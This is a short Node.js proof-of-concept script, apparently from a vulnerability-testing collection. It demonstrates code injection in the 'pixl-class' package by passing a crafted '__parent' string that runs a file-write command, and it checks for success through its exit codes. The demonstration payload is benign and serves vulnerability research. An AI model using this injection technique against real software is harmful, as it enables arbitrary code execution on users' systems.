if (!process.env.DANGEROUS_RUN_VULN) {
	console.log(
		"NOT RUNNING VULNERABLE CODE WITHOUT 'DANGEROUS_RUN_VULN' ENVIRONMENT VARIABLE",
	);
	process.exit(1);
}

const fs = require("fs");
const a = require("pixl-class");
const path = "./pixl-class";
file_exist = fs.existsSync(path);
console.log("a", file_exist);
var members = {
	__parent: 'function(){}; require("fs").writeFileSync("./pixl-class",""); //}',
};
try {
	a.create(members);
} catch (e) {}
file_exist = fs.existsSync(path);
fs.unlink(path, function (err) {});
console.log("b", file_exist);

if (file_exist) {
	process.exit(0);
} else {
	process.exit(82);
}
